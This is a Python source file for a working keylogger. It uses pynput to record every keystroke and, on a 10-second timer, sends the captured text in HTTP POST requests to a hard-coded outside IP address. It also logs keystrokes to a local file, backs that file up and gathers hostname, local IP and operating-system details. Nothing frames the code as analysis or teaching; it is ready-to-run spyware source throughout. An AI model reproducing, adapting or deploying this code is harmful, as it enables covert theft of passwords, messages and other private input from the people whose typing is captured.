import json
import threading
import requests
from pynput import keyboard
import datetime
import os
import socket
import platform

class Keylogger:
    def __init__(self, ip_address="109.74.200.23", port_number="8080", time_interval=10):
        self.ip_address = ip_address
        self.port_number = port_number
        self.time_interval = time_interval
        self.text = ""
        self.log_file_path = "keylog.txt"
        self.start_time = datetime.datetime.now()

    def send_post_req(self):
        try:
            payload = json.dumps({"keyboardData": self.text})
            requests.post(
                f"http://{self.ip_address}:{self.port_number}",
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            self.text = ""
            timer = threading.Timer(self.time_interval, self.send_post_req)
            timer.start()
        except:
            print("Couldn't complete request!")

    def save_to_file(self):
        try:
            with open(self.log_file_path, "a") as file:
                file.write(self.text)
            self.text = ""
        except:
            print("Couldn't save to file!")

    def display_log_summary(self):
        try:
            with open(self.log_file_path, "r") as file:
                contents = file.read()
                print("\n--- Keylog Summary ---")
                print(contents)
                print("----------------------\n")
        except FileNotFoundError:
            print("No log file found.")

    def clear_log(self):
        try:
            open(self.log_file_path, "w").close()
            print("Log file cleared.")
        except:
            print("Couldn't clear log file.")

    def get_system_info(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            system = platform.system()
            release = platform.release()
            system_info = f"Hostname: {hostname}\nLocal IP Address: {ip}\nOperating System: {system} {release}\n"
            print(system_info)
            return system_info
        except:
            print("Couldn't retrieve system info.")
            return ""

    def timestamp_log(self):
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file_path, "a") as file:
                file.write(f"\n--- Log Timestamp: {timestamp} ---\n")
        except:
            print("Couldn't write timestamp to log.")

    def check_log_size(self):
        try:
            if os.path.exists(self.log_file_path):
                size_kb = os.path.getsize(self.log_file_path) / 1024
                print(f"Log file size: {size_kb:.2f} KB")
        except:
            print("Couldn't check log file size.")

    def backup_log(self):
        try:
            backup_path = f"{self.log_file_path}.bak"
            if os.path.exists(self.log_file_path):
                with open(self.log_file_path, "r") as original, open(backup_path, "w") as backup:
                    backup.write(original.read())
                print("Log file backed up.")
        except:
            print("Couldn't backup log file.")

    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                pass
            elif key == keyboard.Key.backspace:
                self.text = self.text[:-1] if len(self.text) > 0 else self.text
            elif key == keyboard.Key.esc:
                self.timestamp_log()
                self.save_to_file()
                self.backup_log()
                self.display_log_summary()
                self.check_log_size()
                self.get_system_info()
                return False
            else:
                self.text += str(key).strip("'")
        except:
            pass

    def start(self):
        print(f"Keylogger started at {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        self.get_system_info()
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.send_post_req()
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
